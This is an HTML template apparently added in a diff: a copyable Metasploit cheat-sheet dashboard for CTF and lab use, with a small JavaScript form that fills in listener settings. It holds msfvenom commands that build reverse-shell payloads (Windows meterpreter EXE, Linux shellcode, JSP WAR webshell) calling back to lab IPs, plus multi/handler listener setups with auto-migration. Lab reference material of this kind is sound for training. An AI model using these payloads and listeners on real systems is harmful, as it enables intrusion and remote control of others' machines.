@@ -1,0 +1,213 @@
+{% load static %}
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width,initial-scale=1" />
+  <title>Msfvenom & Multi/Handler — Dashboard</title>
+  <style>
+    :root{--bg:#0f1724;--card:#0b1220;--accent:#06b6d4;--muted:#94a3b8;--mono:SFMono-Regular,Menlo,Monaco,monospace}
+    html,body{height:100%;margin:0;font-family:Inter,system-ui,Arial,Segoe UI,Helvetica,sans-serif;background:linear-gradient(180deg,#08101a 0%, #071325 100%);color:#e6eef6;font-size:16px;line-height:1.5}
+    .wrap{max-width:1200px;margin:32px auto;padding:22px}
+    header{display:flex;align-items:center;gap:18px}
+    header h1{margin:0;font-size:24px}
+    header p{margin:0;color:var(--muted);font-size:15px}
+    .grid{display:grid;grid-template-columns:1fr 480px;gap:20px;margin-top:20px}
+    .card{background:linear-gradient(180deg, rgba(255,255,255,0.02), rgba(255,255,255,0.01));border:1px solid rgba(255,255,255,0.03);padding:18px;border-radius:12px}
+    .card h2{margin:0 0 10px 0;font-size:20px}
+    .muted{color:var(--muted);font-size:15px}
+    pre{background:#071025;padding:14px;border-radius:10px;overflow:auto;font-family:var(--mono);font-size:15px;margin:10px 0}
+    code{font-family:var(--mono)}
+    .meta{display:flex;gap:10px;align-items:center;flex-wrap:wrap}
+    .btn{background:var(--accent);color:#042026;border:none;padding:10px 12px;border-radius:8px;cursor:pointer;font-weight:700;font-size:14px}
+    .btn.ghost{background:transparent;border:1px solid rgba(255,255,255,0.04);color:var(--muted)}
+    .field{display:flex;gap:10px;align-items:center}
+    label{font-size:14px;color:var(--muted)}
+    input[type=text]{padding:10px;border-radius:8px;border:1px solid rgba(255,255,255,0.03);background:transparent;color:inherit;font-size:15px}
+    .copy-row{display:flex;gap:10px;align-items:center;justify-content:space-between}
+    .small{font-size:13px;color:var(--muted)}
+    footer{margin-top:20px;color:var(--muted);font-size:14px}
+    @media (max-width:980px){.grid{grid-template-columns:1fr}}
+  </style>
+</head>
+<body>
+  <div class="wrap">
+    <header>
+      <div>
+        <h1>msfvenom & <code>exploit/multi/handler</code> — Dashboard</h1>
+        <p class="muted">Interactive, copyable reference for creating payloads and starting Metasploit handlers. (For authorized testing only.)</p>
+      </div>
+      <div style="margin-left:auto" class="meta">
+        <button class="btn" id="copyAll">Copy All</button>
+        <button class="btn ghost" id="downloadHtml">Download HTML</button>
+      </div>
+    </header>
+
+    <div class="grid">
+      <section class="card">
+        <h2>msfvenom — Quick reference</h2>
+        <p class="muted">Generate payloads for tests (exe, elf, war, python, raw...). Replace <code>LHOST</code>/<code>LPORT</code> with your listener IP/port.</p>
+
+        <div class="copy-row">
+          <label class="small">Example: Windows meterpreter EXE</label>
+          <button class="btn" data-target="code-meterp">Copy</button>
+        </div>
+        <pre id="code-meterp"><code>msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.7 LPORT=4444 -f exe -o shell.exe</code></pre>
+
+        <div class="copy-row">
+          <label class="small">Example: Raw shellcode (linux)</label>
+          <button class="btn" data-target="code-raw">Copy</button>
+        </div>
+        <pre id="code-raw"><code>msfvenom -p linux/x86/shell_reverse_tcp LHOST=10.10.14.7 LPORT=4444 -f raw &gt; shell.bin</code></pre>
+
+        <div class="copy-row">
+          <label class="small">Example: Java WAR (webshell)</label>
+          <button class="btn" data-target="code-war">Copy</button>
+        </div>
+        <pre id="code-war"><code>msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.7 LPORT=4444 -f war -o shell.war</code></pre>
+
+        <h3 style="margin-top:12px">Flags cheat-sheet</h3>
+        <pre><code>-p (payload)    -f (format)    LHOST/LPORT    -b (badchars)    -e (encoder) -i (iterations)
+--list payloads   --platform java  -o (output file or use > redirect)
+</code></pre>
+      </section>
+
+      <aside class="card">
+        <h2>Parameterize listener</h2>
+        <p class="muted">Set your LHOST &amp; LPORT here and the handler code will be updated below for easy copying.</p>
+        <div style="margin-top:8px" class="field">
+          <div style="flex:1">
+            <label>Listener IP (LHOST)</label>
+            <input type="text" id="LHOST" value="10.10.16.40" />
+          </div>
+          <div style="width:110px">
+            <label>LPORT</label>
+            <input type="text" id="LPORT" value="4444" />
+          </div>
+        </div>
+
+        <div style="margin-top:12px" class="muted">Handler controls</div>
+        <div style="display:flex;gap:8px;margin-top:8px">
+          <button class="btn" id="genHandler">Generate Handler</button>
+          <button class="btn ghost" id="toggleMigrate">Toggle AutoMigrate</button>
+        </div>
+
+        <div style="margin-top:10px" class="copy-row">
+          <label class="small">Handler (msfconsole)</label>
+          <button class="btn" data-target="code-handler">Copy</button>
+        </div>
+        <pre id="code-handler" spellcheck="false"><code>use exploit/multi/handler
+set PAYLOAD windows/meterpreter/reverse_tcp
+set LHOST 10.10.16.40
+set LPORT 4444
+set ExitOnSession false
+exploit -j -z</code></pre>
+
+        <div style="margin-top:10px" class="small muted">Notes: <br>- <code>-j</code> runs handler as a background job. <code>-z</code> "do not interact"; together they start the handler in the background. <br>- <code>ExitOnSession false</code> keeps handler alive after a session is established. </div>
+      </aside>
+
+      <section class="card" style="grid-column:1/3">
+        <h2>msfconsole — <code>exploit/multi/handler</code> (explanation &amp; copiable commands)</h2>
+        <p class="muted">Place these commands into <code>msfconsole</code> to accept incoming Meterpreter / shell sessions. The code block below is parameterized by the inputs on the right.</p>
+
+        <div class="copy-row">
+          <label class="small">Interactive handler with AutoRunScript (example from your snippet)</label>
+          <button class="btn" data-target="code-snippet1">Copy</button>
+        </div>
+        <pre id="code-snippet1"><code>msf6 &gt; use exploit/multi/handler
+[*] Using configured payload generic/shell_reverse_tcp
+msf6 exploit(multi/handler) &gt; set PAYLOAD windows/meterpreter/reverse_tcp
+PAYLOAD =&gt; windows/meterpreter/reverse_tcp
+msf6 exploit(multi/handler) &gt; set LHOST 10.10.16.40
+LHOST =&gt; 10.10.16.40
+msf6 exploit(multi/handler) &gt; set ExitOnSession false
+ExitOnSession =&gt; false
+msf6 exploit(multi/handler) &gt; set AutoRunScript post/windows/manage/migrate
+AutoRunScript =&gt; post/windows/manage/migrate
+msf6 exploit(multi/handler) &gt; exploit -j -z</code></pre>
+
+        <h3 style="margin-top:12px">Line-by-line explanation</h3>
+        <ul class="muted">
+          <li><code>use exploit/multi/handler</code> — load the generic handler module that waits for reverse connections.</li>
+          <li><code>set PAYLOAD windows/meterpreter/reverse_tcp</code> — tell the handler which payload to expect so it can properly decode an incoming session.</li>
+          <li><code>set LHOST &amp; set LPORT</code> — specify where the payload should connect back (your reachable IP/port).</li>
+          <li><code>set ExitOnSession false</code> — keep the handler alive after a session is created (so it can accept further sessions).</li>
+          <li><code>set AutoRunScript post/windows/manage/migrate</code> — automatically run the specified post module (here: migrate the Meterpreter payload into a stable process) when a session is created.</li>
+          <li><code>exploit -j -z</code> — start the handler as a background job (<code>-j</code>) and do not interact with sessions automatically (<code>-z</code>), leaving them to be managed by you or scripts.</li>
+        </ul>
+
+        <h3 style="margin-top:12px">Best practices & tips</h3>
+        <ul class="muted">
+          <li>Use <code>set ExitOnSession false</code> when you want one handler to accept multiple connections without restarting.</li>
+          <li><code>AutoRunScript</code> is powerful: common scripts include <code>post/windows/manage/migrate</code>, <code>post/multi/manage/smart_migrate</code>, or your custom scripts.</li>
+          <li>For multi-host CTF work, run handlers in background jobs and use <code>sessions -i</code> to interact when needed.</li>
+          <li>Always validate LHOST is reachable from the target (consider VPNs, NAT, or port forwarding).</li>
+        </ul>
+
+        <div style="margin-top:10px" class="copy-row">
+          <label class="small">One-line handler start (copyable)</label>
+          <button class="btn" data-target="code-oneline">Copy</button>
+        </div>
+        <pre id="code-oneline"><code>msfconsole -q -x "use exploit/multi/handler; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST 10.10.16.40; set LPORT 4444; set ExitOnSession false; exploit -j -z"</code></pre>
+
+      </section>
+
+    </div>
+
+    <footer>
+      <div class="muted">Reminder: only use msfvenom &amp; Metasploit against systems you own or are explicitly authorized to test. This dashboard is for learning and lab use.</div>
+    </footer>
+  </div>
+
+  <script>
+    // copy helper
+    function copyText(str){navigator.clipboard.writeText(str).then(()=>{alert('Copied to clipboard')},e=>{alert('Copy failed: '+e)})}
+
+    document.querySelectorAll('button[data-target]').forEach(btn=>{
+      btn.addEventListener('click',()=>{
+        const id = btn.getAttribute('data-target');
+        const el = document.getElementById(id);
+        if(!el)return;
+        copyText(el.innerText);
+      })
+    });
+
+    document.getElementById('copyAll').addEventListener('click',()=>{
+      // gather all code blocks
+      let all = '';
+      document.querySelectorAll('pre code').forEach(c=>{all += c.innerText + '\n\n'});
+      copyText(all);
+    });
+
+    document.getElementById('genHandler').addEventListener('click',()=>{
+      const lhost = document.getElementById('LHOST').value || '10.10.16.40';
+      const lport = document.getElementById('LPORT').value || '4444';
+      const handler = `use exploit/multi/handler\nset PAYLOAD windows/meterpreter/reverse_tcp\nset LHOST ${lhost}\nset LPORT ${lport}\nset ExitOnSession false\nexploit -j -z`;
+      document.getElementById('code-handler').innerText = handler;
+    });
+
+    // toggle to add/remove AutoRunScript line in snippet1
+    let migrated = true;
+    document.getElementById('toggleMigrate').addEventListener('click',()=>{
+      const block = document.getElementById('code-snippet1');
+      let text = block.innerText;
+      if(migrated){
+        text = text.replace('\nmsf6 exploit(multi/handler) > set AutoRunScript post/windows/manage/migrate\nAutoRunScript => post/windows/manage/migrate','');
+        migrated = false;
+      } else {
+        text = text.replace('msf6 exploit(multi/handler) > exploit -j -z','msf6 exploit(multi/handler) > set AutoRunScript post/windows/manage/migrate\nAutoRunScript => post/windows/manage/migrate\nmsf6 exploit(multi/handler) > exploit -j -z');
+        migrated = true;
+      }
+      block.innerText = text;
+    });
+
+    // download HTML
+    document.getElementById('downloadHtml').addEventListener('click',()=>{
+      const html = `<!doctype html>\n` + document.documentElement.outerHTML;
+      const blob = new Blob([html],{type:'text/html'});
+      const url = URL.createObjectURL(blob);
+      const a = document.createElement('a'); a.href = url; a.download = 'msf-multihandler-dashboard.html'; document.body.appendChild(a); a.click(); a.remove(); URL.revokeObjectURL(url);
+    });
+  </script>
+</body>
+</html>
